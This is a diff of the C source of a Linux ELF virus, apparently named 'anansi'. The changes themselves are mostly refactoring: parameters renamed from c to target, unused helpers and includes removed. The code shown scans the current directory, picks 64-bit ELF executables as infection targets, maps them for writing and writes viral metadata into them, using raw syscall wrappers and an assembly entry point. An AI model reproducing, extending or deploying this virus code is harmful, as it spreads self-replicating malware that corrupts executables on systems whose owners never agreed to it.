@@ -1,6 +1,3 @@
-#define _GNU_SOURCE           /* See feature_test_macros(7) */
-#include<dirent.h>
-#include<sys/syscall.h>
 #include<unistd.h>
 #include<sys/stat.h>
 #include<sys/mman.h>
@@ -21,7 +18,6 @@
 #define MAGIC_INITIALIZER_RAN 0xDEADBEEF
 
 #define STDOUT STDOUT_FILENO
-#define PAGE_SIZE 0x1000
 #define FAILURE -1
 #define SUCCESS 0
 
@@ -84,10 +80,10 @@ void decrypt_xor(char *encrypted_str, char *decrypted_str);
 unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size);
 void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size);
 char *create_full_path(char *directory, char *filename);
-void process_elf_initialize(Elfbin *c, char *full_path);
-int process_elf(Elfbin *c, int attr, int perm, int len);
-void process_elf_free(Elfbin *c);
-bool valid_target(Elfbin *c, int min_size, bool no_shared_objects);
+void process_elf_initialize(Elfbin *target, char *full_path);
+int process_elf(Elfbin *target, int attr, int perm, int len);
+void process_elf_free(Elfbin *target);
+bool valid_target(Elfbin *target, int min_size, bool no_shared_objects);
 
 #ifdef DEBUG
 	int anansi_printf(char *format, ...);
@@ -119,7 +115,6 @@ long anansi_close(int fd);
 
 
 void *anansi_memset(void *s, int c, size_t n);
-size_t anansi_strnlen(const char *s, size_t maxlen);
 size_t anansi_strlen(const char *s);
 void *anansi_malloc(size_t len);
 void anansi_strncpy(char *restrict dest, const char *src, size_t n);
@@ -133,7 +128,7 @@ struct linux_dirent {
 	char           d_name[NAME_MAX +1];  /* Filename (null-terminated) */
 };
 
-int _start() {
+void _start() {
 	__asm__ volatile (
 			".globl real_start\n"
 			"real_start:\n"
@@ -181,7 +176,7 @@ void vx_main()
 	char *full_path = NULL;
 
 	struct linux_dirent *d;
-	int cwd_fd, nread, attr, status = SUCCESS, max_target = MAX_TARGET;
+	int cwd_fd, nread, attr, max_target = MAX_TARGET;
 	const size_t DIR_LISTING_SIZE = 5000;
 
 	Elfbin target;
@@ -196,18 +191,15 @@ void vx_main()
 #endif
 
 	if(!(cwd = anansi_malloc(PATH_MAX))) {
-		status = FAILURE;
 		goto clean_up;
 	}
 
 	if(!(cwd_listings = anansi_malloc(DIR_LISTING_SIZE))) {
-		status = FAILURE;
 		goto clean_up;
 	}
 
 	anansi_getcwd(cwd, PATH_MAX);
 	if((cwd_fd = anansi_open(cwd, O_RDONLY | O_DIRECTORY, 0)) < 0) {
-		status = FAILURE;
 		goto clean_up;
 	}
 
@@ -656,11 +648,11 @@ int process_elf(Elfbin *target, int attr, int perm, int len)
  - Necessary for process_elf_free() to work correctly.
 */
 
-void process_elf_initialize(Elfbin *c, char *full_path)
+void process_elf_initialize(Elfbin *target, char *full_path)
 {
-	anansi_memset(c, 0, sizeof(Elfbin));
-	c->initializer_ran = MAGIC_INITIALIZER_RAN;
-	c->f_path = full_path;
+	anansi_memset(target, 0, sizeof(Elfbin));
+	target->initializer_ran = MAGIC_INITIALIZER_RAN;
+	target->f_path = full_path;
 }
 
 /*
@@ -669,58 +661,58 @@ void process_elf_initialize(Elfbin *c, char *full_path)
  - Zero out other fields (discourage reuse of the reference).
 */
 
-void process_elf_free(Elfbin *c)
+void process_elf_free(Elfbin *target)
 {
-	if(c->initializer_ran == MAGIC_INITIALIZER_RAN) {
-		if(c->perm == PROCESS_ELF_O_ATTRONLY) {
-			if(c->ehdr != NULL)
-				anansi_munmap(c->ehdr, sizeof(Elf64_Ehdr));
-			if(c->phdr != NULL)
-				anansi_munmap(c->phdr, sizeof(Elf64_Phdr));
-			if(c->shdr != NULL)
-				anansi_munmap(c->shdr, sizeof(Elf64_Shdr));
+	if(target->initializer_ran == MAGIC_INITIALIZER_RAN) {
+		if(target->perm == PROCESS_ELF_O_ATTRONLY) {
+			if(target->ehdr != NULL)
+				anansi_munmap(target->ehdr, sizeof(Elf64_Ehdr));
+			if(target->phdr != NULL)
+				anansi_munmap(target->phdr, sizeof(Elf64_Phdr));
+			if(target->shdr != NULL)
+				anansi_munmap(target->shdr, sizeof(Elf64_Shdr));
 		}
 
 
-		if(c->perm == PROCESS_ELF_O_RDONLY || c->perm == PROCESS_ELF_O_RDWR)
-			if(c->read_only_mem != NULL)
-				anansi_munmap(c->read_only_mem, c->orig_size);
+		if(target->perm == PROCESS_ELF_O_RDONLY || target->perm == PROCESS_ELF_O_RDWR)
+			if(target->read_only_mem != NULL)
+				anansi_munmap(target->read_only_mem, target->orig_size);
 
 
-		if(c->perm == PROCESS_ELF_O_RDWR)
-			if(c->write_only_mem != NULL)
-				anansi_munmap(c->write_only_mem, c->new_size);;
+		if(target->perm == PROCESS_ELF_O_RDWR)
+			if(target->write_only_mem != NULL)
+				anansi_munmap(target->write_only_mem, target->new_size);;
 
 
-		anansi_close(c->fd);
-		c->orig_size = 0;
-		c->new_size = 0;
-		c->perm = 0;
+		anansi_close(target->fd);
+		target->orig_size = 0;
+		target->new_size = 0;
+		target->perm = 0;
 	}
 }
 
-bool valid_target(Elfbin *c, int min_size, bool no_shared_objects)
+bool valid_target(Elfbin *target, int min_size, bool no_shared_objects)
 {
 	bool pt_interp_present = false;
 
 	//If less than a ELF header (64-bit), lets not waste syscalls.
-	if(c->orig_size < min_size)
+	if(target->orig_size < min_size)
 		return false;
 
-	if(*(uint8_t *)(c->read_only_mem + EI_CLASS) != ELFCLASS64)
+	if(*(uint8_t *)(target->read_only_mem + EI_CLASS) != ELFCLASS64)
 		return false;
 
-	if(c->ehdr->e_type != ET_EXEC)
-		if(c->ehdr->e_type != ET_DYN)
+	if(target->ehdr->e_type != ET_EXEC)
+		if(target->ehdr->e_type != ET_DYN)
 			return false;
 
 	if(no_shared_objects) {
 		//ET_DYN is an elf type shared by both shared objects and PIE binaries.
 		//The absence of a program header of type PT_INTERP in conjunction with ET_DYN is indicative of a shared object.
 		//libc and ld-linux are exceptions, since they are both libraries and executables
-		if(c->ehdr->e_type == ET_DYN) {
-			for(int p_entry = 0; p_entry < c->ehdr->e_phnum; p_entry++) {
-				if(c->phdr[p_entry].p_type == PT_INTERP)
+		if(target->ehdr->e_type == ET_DYN) {
+			for(int p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++) {
+				if(target->phdr[p_entry].p_type == PT_INTERP)
 					pt_interp_present = true;
 			}
 
@@ -981,15 +973,6 @@ size_t anansi_strlen(const char *s)
 	return len;
 }
 
-size_t anansi_strnlen(const char *s, size_t maxlen)
-{
-	size_t len;
-	for(len = 0; len < maxlen && *s != '\0'; len++)
-		s++;
-
-	return len;
-}
-
 void *anansi_malloc(size_t len)
 {
 	void *mem;
@@ -1187,7 +1170,7 @@ int anansi_strncmp(const char *s1, const char *s2, size_t n)
 __exit_syscall(int, anansi_exit, status, int);
 __write_syscall(long, anansi_write, fd, int, buf, const void *, count, size_t);
 __read_syscall(long, anansi_read, fd, int, buf, void *, count, size_t);
-__mmap_syscall(void *, anansi_mmap, addr, void *, length, size_t, prot, int, flags, int, fd, int, offset, off_t);
+__mmap_syscall(void *, anansi_mmap, addr, void *, len, size_t, prot, int, flags, int, fildes, int, off, off_t);
 __stat_syscall(long, anansi_stat, path, char *, statbuf, struct stat *);
 __munmap_syscall(long, anansi_munmap, addr, void *, len, size_t);
 __open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int);
